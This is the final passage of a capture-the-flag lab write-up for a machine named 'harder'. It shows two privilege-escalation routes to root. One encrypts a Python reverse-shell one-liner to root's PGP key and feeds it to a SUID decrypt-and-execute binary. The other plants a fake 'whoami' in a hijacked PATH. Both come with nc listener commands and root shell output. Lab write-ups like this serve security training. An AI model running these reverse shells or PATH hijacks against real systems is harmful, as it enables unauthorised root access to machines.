c5gXzwk3rMMA/0JK6ZwZCHObWjwX0oLc3jvOCgQiIdaPq1WqN9/fhLAKuDgEXwTf
8RIKKwYBBAGXVQEFAQEHQNa/To/VntzySOVdvOCW+iGscTLlnsjOmiGaaWvJG14O
AwEIB4h4BBgWCAAgFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwwACgkQ
yR1mFZRPaHTMLQD/cqbV4dMvINa/KxATQDnbaln1Lg0jI9Jie39U44GKRIEBAJyi
+2AO+ERYahiVzkWwTEoUpjDJIv0cP/WVzfTvPk0D
=qaa6
-----END PGP PUBLIC KEY BLOCK-----
```

A public PGP key for `root`??

**Now, since we're user `evs`, we can take look at the `/usr/local/bin/execute-crypted` SUID binary:**
```
harder:~$ /usr/local/bin/execute-crypted
[*] Current User: root
[-] This program runs only commands which are encypted for root@harder.local using gpg.
[-] Create a file like this: echo -n whoami > command
[-] Encrypt the file and run the command: execute-crypted command.gpg
```

**Let's use `strings` to list all the strings inside that exectuable:**
```
harder:~$ strings /usr/local/bin/execute-crypted
[...]
/usr/local/bin/run-crypted.sh %s
/usr/local/bin/run-crypted.sh
[...]
```

It's using a SH script from `/usr/local/bin/run-crypted.sh`!

```
harder:~$ ls -alh /usr/local/bin/run-crypted.sh
-rwxr-x---    1 root     evs          412 Jul  7  2020 /usr/local/bin/run-crypted.sh
```

**`run-crypted.sh`:**
```sh
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi
```

**Looks like it's using `gpg` to decrypt a file!**

Now, since we have a PGP public key owned by `root`, **we can try to get a reverse shell**!!

**To do so, I'll:**

- Import the PGP public key via `gpg --import`:

```
harder:~$ gpg --import /var/backup/root@harder.local.pub
gpg: directory '/home/evs/.gnupg' created
gpg: keybox '/home/evs/.gnupg/pubring.kbx' created
gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created
gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported
gpg: Total number processed: 1
gpg:               imported: 1
```

- Create a file with a Python reverse shell payload:

```
harder:~$ vi revshell 
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.0.253",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

- Encrypt the file:

```
harder:~$ gpg --encrypt --output revshell.gpg --recipient root@harder.local revshell 
gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user

sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>
 Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874
      Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868

It is NOT certain that the key belongs to the person named
in the user ID.  If you *really* know what you are doing,
you may answer the next question with yes.

Use this key anyway? (y/N) y

harder:~$ ls -lah           
[...]
-rw-r--r--    1 evs      evs          184 Nov 20 13:21 revshell.gpg
```

**Now we have `evil_command.gpg`, we can decrypt it via `/usr/local/bin/execute-crypted` and get a reverse shell!**

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 4445      
listening on [any] 4445 ...
```

- Run the `/usr/local/bin/execute-crypted` with the encrypted `revshell.gpg`:

```
harder:~$ /usr/local/bin/execute-crypted revshell.gpg 
gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07
      "Administrator <root@harder.local>"
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 4445      
listening on [any] 4445 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.233.137] 39870
harder:/home/evs# ^[[23;19Rwhoami;hostname;id;ip a
whoami;hostname;id;ip a
root
harder
uid=0(root) gid=1000(evs) groups=1000(evs)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
harder:/home/evs# ^[[23;19R
```

I'm root! :D

#### Exploiting Relative Path

**In `run-crypted.sh`, we can also see that the `whoami`, `gpg` command are using relative path and it's own by `root`, which can be abused to escalate to `root`! If they are using absolute path (E.g. `/usr/bin/whoami`), we can't escalate to `root` via this method!**

**`run-crypted.sh`:**
```sh
#!/bin/sh

if [ $# -eq 0 ]
  then
    echo -n "[*] Current User: ";
    whoami;
    echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."
    echo "[-] Create a file like this: echo -n whoami > command"
    echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"
  else
    export GNUPGHOME=/root/.gnupg/
    gpg --decrypt --no-verbose "$1" | ash
fi
```

**To exploit relative path, I'll:**

- Export a new PATH environment variable:

```
harder:~$ cd /tmp
harder:/tmp$ export PATH=/tmp:$PATH
```

- Create a fake `whoami` script with Python reverse shell payload:

```
harder:/tmp$ vi whoami
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.9.0.253",4445));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/sh")'
```

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 4445
listening on [any] 4445 ...
```

- Run the `/usr/local/bin/execute-crypted` executable:

```
harder:/tmp$ /usr/local/bin/execute-crypted
[*] Current User: 
```

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/harder]
└─# nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.233.137] 39912
harder:/tmp# ^[[23;14Rwhoami;hostname;id;ip a
whoami;hostname;id;ip a
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ConnectionRefusedError: [Errno 111] Connection refused
harder
uid=0(root) gid=1000(evs) groups=1000(evs)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
harder:/tmp# ^[[23;14R
```

I'm root! :D

## Rooted

**root.txt:**
```
harder:/home/evs# ^[[23;19Rcat /root/root.txt
{Redacted}
```

# Conclusion

What we've learned:

1. Directory Enumeration
2. HTTP Header `X-Forwarded-For` Bypass
3. Dumping Publicly Exposed `.git` Repository
4. PHP `hash_hmac()` Bypass
5. Privilege Escalation via Plaintext Password in a File
6. Privilege Escalation via Abusing GPG Decryption
7. Privilege Escalation via Exploiting Relative Path